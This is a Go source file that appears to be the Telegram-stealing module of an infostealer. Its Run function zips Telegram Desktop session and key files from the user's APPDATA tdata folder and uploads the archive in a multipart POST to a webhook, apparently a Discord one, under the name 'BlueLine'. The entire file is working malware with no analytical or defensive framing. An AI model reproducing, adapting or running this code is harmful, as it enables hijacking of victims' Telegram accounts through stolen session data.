package tg

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func Run() {
	sourceFolder := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")

	filesAndFolders := []string{"A7FDF864FBC10B77s", "A7FDF864FBC10B77", "D877F783D5D3EF8C", "D877F783D5D3EF8Cs", "key_datas"}

	outputZip := filepath.Join(os.Getenv("PUBLIC"), "Libraries", "Telegram.zip")

	err := createZipArchive(sourceFolder, filesAndFolders, outputZip)
	if err != nil {
		fmt.Println("Error creating zip archive:", err)
		return
	}

	webhookURL := "hook"

	file, err := os.Open(outputZip)
	if err != nil {
		fmt.Println("Error opening zip file:", err)
		return
	}
	defer file.Close()

	files := map[string]*os.File{
		"file": file,
	}
	avatar := "https://i.ibb.co/GFZ2tHJ/shakabaiano-1674282487.jpg"
	username := "BlueLine"

	_, err = uploadToWebhook(webhookURL, files, avatar, username)
	if err != nil {
		return
	}

}
func uploadToWebhook(url string, files map[string]*os.File, avatar string, username string) (string, error) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	if avatar != "" {
		writer.WriteField("avatar", avatar)
	}
	if username != "" {
		writer.WriteField("username", username)
	}
	for key, file := range files {
		part, err := writer.CreateFormFile(key, file.Name())
		if err != nil {
			return "", err
		}
		_, err = io.Copy(part, file)
		if err != nil {
			return "", err
		}
	}
	err := writer.Close()
	if err != nil {
		return "", err
	}
	request, err := http.NewRequest("POST", url, body)
	if err != nil {
		return "", err
	}
	request.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	responseBody, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(responseBody), nil
}
func createZipArchive(sourceFolder string, filesAndFolders []string, outputZip string) error {
	zipFile, err := os.Create(outputZip)
	if err != nil {
		return err
	}
	defer zipFile.Close()
	archive := zip.NewWriter(zipFile)
	defer archive.Close()
	for _, item := range filesAndFolders {
		itemPath := filepath.Join(sourceFolder, item)
		fileInfo, err := os.Stat(itemPath)
		if err != nil {
			return err
		}
		if fileInfo.IsDir() {
			err = filepath.Walk(itemPath, func(filePath string, info os.FileInfo, err error) error {
				if err != nil {
					return err
				}

				header, err := zip.FileInfoHeader(info)
				if err != nil {
					return err
				}

				relPath, err := filepath.Rel(sourceFolder, filePath)
				if err != nil {
					return err
				}

				header.Name = relPath

				if info.IsDir() {
					header.Name += "/"
				}

				writer, err := archive.CreateHeader(header)
				if err != nil {
					return err
				}

				if !info.IsDir() {
					content, err := os.Open(filePath)
					if err != nil {
						return err
					}
					defer content.Close()

					_, err = io.Copy(writer, content)
					if err != nil {
						return err
					}
				}

				return nil
			})
			if err != nil {
				return err
			}
		} else {
			file, err := os.Open(itemPath)
			if err != nil {
				return err
			}
			defer file.Close()

			writer, err := archive.Create(item)
			if err != nil {
				return err
			}
			_, err = io.Copy(writer, file)
			if err != nil {
				return err
			}
		}
	}
	return nil
}
